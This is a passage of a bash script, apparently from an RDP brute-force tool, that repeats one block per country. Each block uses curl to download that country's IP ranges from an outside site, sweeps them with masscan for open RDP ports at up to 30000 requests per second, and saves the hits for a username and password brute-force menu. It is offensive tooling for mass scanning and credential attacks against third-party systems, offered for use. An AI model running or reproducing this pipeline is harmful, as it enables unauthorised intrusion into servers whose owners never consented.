echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "38" ]; then
curl http://ipdiapazon.16mb.com/Central_african_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "39" ]; then
curl http://ipdiapazon.16mb.com/Chile.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "40" ]; then
curl http://ipdiapazon.16mb.com/China.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "41" ]; then
curl http://ipdiapazon.16mb.com/Colombia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "42" ]; then
curl http://ipdiapazon.16mb.com/Congo.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "43" ]; then
curl http://ipdiapazon.16mb.com/Cook_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "44" ]; then
curl http://ipdiapazon.16mb.com/Costa_rica.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "45" ]; then
curl http://ipdiapazon.16mb.com/Cote.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "46" ]; then
curl http://ipdiapazon.16mb.com/Croatia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "47" ]; then
curl http://ipdiapazon.16mb.com/Cuba.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "48" ]; then
curl http://ipdiapazon.16mb.com/Cyprus.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "49" ]; then
curl http://ipdiapazon.16mb.com/Czech_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "50" ]; then
curl http://ipdiapazon.16mb.com/Denmark.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "51" ]; then
curl http://ipdiapazon.16mb.com/Djibouti.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "52" ]; then
curl http://ipdiapazon.16mb.com/Dominican_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "53" ]; then
curl http://ipdiapazon.16mb.com/Ecuador.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "54" ]; then
curl http://ipdiapazon.16mb.com/Egypt.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "55" ]; then
curl http://ipdiapazon.16mb.com/El_salvador.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "56" ]; then
curl http://ipdiapazon.16mb.com/Eritrea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
